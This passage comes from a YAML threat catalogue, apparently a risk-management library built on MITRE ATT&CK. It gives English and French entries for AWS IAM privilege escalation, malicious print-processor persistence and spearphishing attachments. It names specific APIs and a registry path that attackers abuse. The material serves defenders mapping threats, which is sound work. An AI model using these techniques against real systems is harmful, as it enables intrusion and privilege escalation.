          \ dans les environnements AWS, un adversaire disposant des permissions appropri\xE9\
          es peut \xEAtre capable d'utiliser l'API <code>CreatePolicyVersion</code>\
          \ pour d\xE9finir une nouvelle version d'une politique IAM ou l'API <code>AttachUserPolicy</code>\
          \ pour attacher une politique IAM avec des permissions suppl\xE9mentaires\
          \ ou distinctes \xE0 un compte utilisateur compromis. (Citation : Escalade\
          \ des privil\xE8ges AWS de Rhino Security Labs)\n\nDans certains cas, les\
          \ adversaires peuvent ajouter des r\xF4les aux comptes contr\xF4l\xE9s par\
          \ l'adversaire en dehors du locataire cloud de la victime. Cela permet \xE0\
          \ ces comptes externes d'effectuer des actions \xE0 l'int\xE9rieur du locataire\
          \ victime sans que l'adversaire ait \xE0 [Cr\xE9er un compte](https://attack.mitre.org/techniques/T1136)\
          \ ou \xE0 modifier un compte appartenant \xE0 la victime. (Citation : Invictus\
          \ IR DangerDev 2024)https://attack.mitre.org/techniques/T1098/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.012
    ref_id: T1547.012
    name: Print Processors
    description: 'Adversaries may abuse print processors to run malicious DLLs during
      system boot for persistence and/or privilege escalation. Print processors are
      DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation:
      Microsoft Intro Print Processors)


      Adversaries may abuse the print spooler service by adding print processors that
      load malicious DLLs at startup. A print processor can be installed through the
      <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code>
      enabled. Alternatively, a print processor can be registered to the print spooler
      service by adding the <code>HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows
      architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver</code>
      Registry key that points to the DLL.


      For the malicious print processor to be correctly installed, the payload must
      be located in the dedicated system print-processor directory, that can be found
      with the <code>GetPrintProcessorDirectory</code> API call, or referenced via
      a relative path from this directory.(Citation: Microsoft AddPrintProcessor May
      2018) After the print processors are installed, the print spooler service, which
      starts during boot, must be restarted in order for them to run.(Citation: ESET
      PipeMon May 2020)


      The print spooler service runs under SYSTEM level permissions, therefore print
      processors installed by an adversary may run under elevated privileges.

      https://attack.mitre.org/techniques/T1547/012'
    translations:
      fr:
        name: Processeurs d'impression
        description: "Les adversaires peuvent abuser des processeurs d'impression\
          \ pour ex\xE9cuter des DLL malveillantes lors du d\xE9marrage du syst\xE8\
          me afin de persister et/ou d'augmenter les privil\xE8ges. Les processeurs\
          \ d'impression sont des DLL charg\xE9s par le service de spooler d'impression,\
          \ \xAB spoolsv.exe \xBB, lors du d\xE9marrage. (Citation : Microsoft Intro\
          \ Print Processors)\n\nLes adversaires peuvent abuser du service de spooler\
          \ d'impression en ajoutant des processeurs d'impression qui chargent des\
          \ DLL malveillants au d\xE9marrage. Un processeur d'impression peut \xEA\
          tre install\xE9 via l'appel API <code>AddPrintProcessor</code> avec un compte\
          \ ayant activ\xE9 <code>SeLoadDriverPrivilege</code>. Alternativement, un\
          \ processeur d'impression peut \xEAtre enregistr\xE9 au service de spooler\
          \ d'impression en ajoutant la cl\xE9 <code>HKLM\\SYSTEM\\\\[CurrentControlSet\
          \ ou ControlSet001]\\Control\\Print\\Environments\\\\[architecture Windows\
          \ : par exemple, Windows x64]\\Print Processors\\\\[d\xE9fini par l'utilisateur]\\\
          Driver</code> Cl\xE9 de registre qui pointe vers la DLL.\n\nPour que le\
          \ processeur d'impression malveillant soit correctement install\xE9, la\
          \ charge utile doit \xEAtre situ\xE9e dans le r\xE9pertoire d\xE9di\xE9\
          \ du processeur d'impression syst\xE8me, qui peut \xEAtre trouv\xE9 avec\
          \ l'appel API <code>GetPrintProcessorDirectory</code>, ou r\xE9f\xE9renc\xE9\
          \ via un chemin relatif depuis ce r\xE9pertoire. (Citation : Microsoft AddPrintProcessor\
          \ mai 2018) Apr\xE8s l'installation des processeurs d'impression, le service\
          \ de spooler d'impression, qui d\xE9marre au d\xE9marrage, doit \xEAtre\
          \ red\xE9marr\xE9 pour qu'ils puissent fonctionner. (Citation : ESET PipeLundi\
          \ mai 2020)\n\nLe service de spooler d'impression fonctionne sous des permissions\
          \ au niveau SYST\xC8ME, donc les processeurs d'impression install\xE9s par\
          \ un adversaire peuvent fonctionner sous des privil\xE8ges \xE9lev\xE9s.https\_\
          ://attack.mitre.org/techniques/T1547/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1566.001
    ref_id: T1566.001
    name: Spearphishing Attachment
    description: 'Adversaries may send spearphishing emails with a malicious attachment
      in an attempt to gain access to victim systems. Spearphishing attachment is
      a specific variant of spearphishing. Spearphishing attachment is different from
      other forms of spearphishing in that it employs the use of malware attached
      to an email. All forms of spearphishing are electronically delivered social
      engineering targeted at a specific individual, company, or industry. In this
      scenario, adversaries attach a file to the spearphishing email and usually rely
      upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation:
      Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering
      techniques, such as posing as a trusted source.


      There are many options for the attachment such as Microsoft Office documents,
      executables, PDFs, or archived files. Upon opening the attachment (and potentially
      clicking past protections), the adversary''s payload exploits a vulnerability
      or directly executes on the user''s system. The text of the spearphishing email
      usually tries to give a plausible reason why the file should be opened, and
      may explain how to bypass system protections in order to do so. The email may
      also contain instructions on how to decrypt an attachment, such as a zip file
      password, in order to evade email boundary defenses. Adversaries frequently
      manipulate file extensions and icons in order to make attached executables appear
      to be document files, or files exploiting one application appear to be a file
      for a different one.

      https://attack.mitre.org/techniques/T1566/001'
    translations:
      fr:
        name: "Pi\xE8ce jointe Spearphishing"
        description: "Les adversaires peuvent envoyer des courriels de spearphishing\
